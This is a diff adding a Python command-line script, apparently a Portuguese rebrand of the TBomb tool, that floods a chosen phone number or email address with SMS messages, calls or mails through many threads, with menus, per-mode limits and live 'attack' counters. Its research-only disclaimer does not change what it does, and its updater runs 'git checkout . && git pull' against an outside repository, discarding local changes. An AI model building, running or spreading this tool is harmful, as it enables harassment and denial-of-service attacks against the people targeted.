@@ -1,0 +1,367 @@
+import os
+import shutil
+import sys
+import subprocess
+import string
+import random
+import json
+import re
+import time
+import argparse
+import zipfile
+from io import BytesIO
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+try:
+    import requests
+    from colorama import Fore, Style
+except ImportError:
+    print("\tAlgumas dependências não puderam ser importadas (possivelmente não instaladas)")
+    print("Digite `pip3 install -r requirements.txt` para instalar todos os pacotes requeridos")
+    sys.exit(1)
+
+
+def readisdc():
+    with open("isdcodes.json") as file:
+        isdcodes = json.load(file)
+    return isdcodes
+
+
+def get_version():
+    try:
+        with open(".version", "r") as f:
+            return f.read().strip()
+    except Exception:
+        return '4.0.0.0'
+
+
+def clr():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+
+def bann_text():
+    clr()
+    logo = "DCL 🇱🇻"
+    if ASCII_MODE:
+        logo = ""
+    version = "Versão: " + __VERSION__
+    contributors = "Criador: >SPAM>🖋️🚨"
+    creator_link = "GitHub: https://github.com/DOCTORcoringa"
+    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
+    print(version)
+    print(contributors)
+    print(creator_link)
+    print()
+
+
+def check_intr():
+    try:
+        requests.get("https://motherfuckingwebsite.com")
+    except Exception:
+        bann_text()
+        print("Conexão com a internet ruim detectada")
+        sys.exit(2)
+
+
+def format_phone(num):
+    num = [n for n in num if n in string.digits]
+    return ''.join(num).strip()
+
+
+def do_zip_update():
+    print("Atualização via ZIP está desativada nesta versão.")
+    print("Por favor, atualize manualmente se necessário.")
+    sys.exit()
+
+
+def do_git_update():
+    success = False
+    try:
+        print(ALL_COLORS[0]+"ATUALIZANDO "+RESET_ALL, end='')
+        process = subprocess.Popen("git checkout . && git pull ",
+                                   shell=True,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT)
+        while process:
+            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
+            time.sleep(1)
+            returncode = process.poll()
+            if returncode is not None:
+                break
+        success = not process.returncode
+    except Exception:
+        success = False
+    print("\n")
+
+    if success:
+        print("DCL 🇱🇻 foi atualizado para a última versão")
+        print("Por favor, execute o script novamente para carregar a nova versão")
+    else:
+        print("Não foi possível atualizar o DCL 🇱🇻.")
+        print("Certifique-se de ter o 'git' instalado e tente novamente")
+    sys.exit()
+
+
+def update():
+    if shutil.which('git'):
+        do_git_update()
+    else:
+        do_zip_update()
+    with open(".version", "w") as f:
+        f.write("4.0.0.1")
+    print("DCL 🇱🇻 foi atualizado para a versão 4.0.0.1")
+    print("Por favor, execute o programa novamente para carregar a nova versão")
+    sys.exit()
+
+
+def check_for_updates():
+    if DEBUG_MODE:
+        print("MODO DEBUG ativado! Verificação automática de atualização desativada.")
+        return
+    print("Checando por atualizações")
+    fver = requests.get(
+        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version"
+    ).text.strip()
+    if fver != __VERSION__:
+        print("Uma atualização está disponível")
+        print("Iniciando atualização...")
+        update()
+    else:
+        print("DCL 🇱🇻 está atualizado")
+        print("Iniciando DCL 🇱🇻")
+
+
+def notifyen():
+    try:
+        if DEBUG_MODE:
+            url = "https://github.com/TheSpeedX/TBomb/raw/dev/.notify"
+        else:
+            url = "https://github.com/TheSpeedX/TBomb/raw/master/.notify"
+        noti = requests.get(url).text.upper()
+        if len(noti) > 10:
+            print("NOTIFICAÇÃO: " + noti)
+            print()
+    except Exception:
+        pass
+
+
+def get_phone_info():
+    while True:
+        cc = input("Digite o código do país (sem +): ")
+        cc = format_phone(cc)
+        if not country_codes.get(cc, False):
+            print(f"O código do país ({cc}) que você digitou é inválido ou não suportado")
+            continue
+        target = input("Digite o número alvo: +" + cc + " ")
+        target = format_phone(target)
+        if (len(target) <= 6) or (len(target) >= 12):
+            print(f"O número de telefone ({target}) que você digitou é inválido")
+            continue
+        return cc, target
+
+
+def get_mail_info():
+    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
+    while True:
+        target = input("Digite o email alvo: ")
+        if not re.search(mail_regex, target, re.IGNORECASE):
+            print(f"O email ({target}) que você digitou é inválido")
+            continue
+        return target
+
+
+def pretty_print(cc, target, success, failed):
+    requested = success + failed
+    print("Ataque em progresso - Por favor, aguarde")
+    print("Mantenha-se conectado à internet durante o ataque")
+    print("Alvo         : " + cc + " " + target)
+    print("Enviadas    : " + str(requested))
+    print("Sucesso     : " + str(success))
+    print("Falhas      : " + str(failed))
+    print("Esta ferramenta foi feita para fins de pesquisa e estudo")
+    print("Criado por >SPAM>🖋️🚨")
+
+
+def workernode(mode, cc, target, count, delay, max_threads):
+
+    api = APIProvider(cc, target, mode, delay=delay)
+    clr()
+    print("Preparando o ataque - Por favor, aguarde")
+    print("Mantenha-se conectado à internet durante o ataque")
+    print("Versão da API: " + api.api_version)
+    print("Alvo        : " + cc + target)
+    print("Quantidade  : " + str(count))
+    print("Threads     : " + str(max_threads) + " threads")
+    print("Delay       : " + str(delay) + " segundos")
+    print("Esta ferramenta foi feita para fins de pesquisa e estudo")
+    print()
+    input("Pressione [CTRL+Z] para pausar o ataque ou [ENTER] para continuar")
+
+    if len(APIProvider.api_providers) == 0:
+        print("País ou alvo ainda não suportado")
+        print("Sinta-se à vontade para nos contatar")
+        input("Pressione [ENTER] para sair")
+        bann_text()
+        sys.exit()
+
+    success, failed = 0, 0
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = []
+            for i in range(count - success):
+                jobs.append(executor.submit(api.hit))
+
+            for job in as_completed(jobs):
+                result = job.result()
+                if result is None:
+                    print("Limite de ataques para o alvo atingido")
+                    print("Tente novamente mais tarde")
+                    input("Pressione [ENTER] para sair")
+                    bann_text()
+                    sys.exit()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                clr()
+                pretty_print(cc, target, success, failed)
+    print("\n")
+    print("Ataque concluído!")
+    time.sleep(1.5)
+    bann_text()
+    sys.exit()
+
+
+def selectnode(mode="sms"):
+    mode = mode.lower().strip()
+    try:
+        clr()
+        bann_text()
+        check_intr()
+        check_for_updates()
+        notifyen()
+
+        max_limit = {"sms": 500, "call": 15, "mail": 200}
+        cc, target = "", ""
+        if mode in ["sms", "call"]:
+            cc, target = get_phone_info()
+            if cc != "91":
+                max_limit.update({"sms": 100})
+        elif mode == "mail":
+            target = get_mail_info()
+        else:
+            raise KeyboardInterrupt
+
+        limit = max_limit[mode]
+        while True:
+            try:
+                message = f"Digite a quantidade de {mode.upper()} para enviar (Máx {limit}): "
+                count = int(input(message).strip())
+                if count > limit or count == 0:
+                    print(f"Você solicitou {count} {mode.upper()}")
+                    print(f"Valor será automaticamente limitado a {limit}")
+                    count = limit
+                delay = float(input("Digite o tempo de delay (em segundos): ").strip())
+                max_thread_limit = (count // 10) if (count // 10) > 0 else 1
+                max_threads = int(input(f"Digite o número de threads (Recomendado: {max_thread_limit}): ").strip())
+                max_threads = max_threads if (max_threads > 0) else max_thread_limit
+                if count < 0 or delay < 0:
+                    raise Exception
+                break
+            except KeyboardInterrupt:
+                raise
+            except Exception:
+                print("Leia as instruções com atenção!!!")
+                print()
+
+        workernode(mode, cc, target, count, delay, max_threads)
+    except KeyboardInterrupt:
+        print("Interrupção detectada - Encerrando...")
+        sys.exit()
+
+
+mesgdcrt = None
+if sys.version_info[0] != 3:
+    print("Este programa requer Python 3")
+    sys.exit()
+
+try:
+    country_codes = readisdc()["isdcodes"]
+except FileNotFoundError:
+    update()
+
+
+__VERSION__ = get_version()
+__CONTRIBUTORS__ = ['>SPAM>🖋️🚨']
+
+ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
+RESET_ALL = Style.RESET_ALL
+
+ASCII_MODE = False
+DEBUG_MODE = False
+
+description = """DCL 🇱🇻 - Seu Aplicativo Amigável de Spam
+
+DCL 🇱🇻 pode ser usado para vários propósitos, incluindo:
+\t Expor APIs vulneráveis na Internet
+\t Spam Amigável
+\t Testar seu Detector de Spam e mais...
+
+DCL 🇱🇻 não é destinado a usos maliciosos.
+"""
+
+parser = argparse.ArgumentParser(description=description,
+                                 epilog='Criado por >SPAM>🖋️🚨')
+parser.add_argument("-sms", "--sms", action="store_true",
+                    help="Iniciar DCL 🇱🇻 no modo SMS")
+parser.add_argument("-call", "--call", action="store_true",
+                    help="Iniciar DCL 🇱🇻 no modo chamada")
+parser.add_argument("-mail", "--mail", action="store_true",
+                    help="Iniciar DCL 🇱🇻 no modo email")
+parser.add_argument("-ascii", "--ascii", action="store_true",
+                    help="Mostrar apenas caracteres do conjunto ASCII padrão")
+parser.add_argument("-u", "--update", action="store_true",
+                    help="Atualizar o DCL 🇱🇻")
+parser.add_argument("-c", "--contributors", action="store_true",
+                    help="Mostrar criadores atuais")
+parser.add_argument("-v", "--version", action="store_true",
+                    help="Mostrar versão atual do DCL 🇱🇻")
+
+
+if __name__ == "__main__":
+    args = parser.parse_args()
+    if args.ascii:
+        ASCII_MODE = True
+    if args.version:
+        print("Versão: ", __VERSION__)
+    elif args.contributors:
+        print("Criadores: ", " ".join(__CONTRIBUTORS__))
+    elif args.update:
+        update()
+    elif args.mail:
+        selectnode(mode="mail")
+    elif args.call:
+        selectnode(mode="call")
+    elif args.sms:
+        selectnode(mode="sms")
+    else:
+        choice = ""
+        options = {"1": "SMS", "2": "CALL", "3": "MAIL"}
+        try:
+            while choice not in options:
+                clr()
+                bann_text()
+                print("Opções disponíveis:\n")
+                for key, val in options.items():
+                    print(f"[ {key} ] {val} BOMB")
+                print()
+                choice = input("Digite sua escolha : ")
+            selectnode(mode=options[choice].lower())
+        except KeyboardInterrupt:
+            print("Interrupção detectada - Encerrando...")
+            sys.exit()
+    sys.exit()
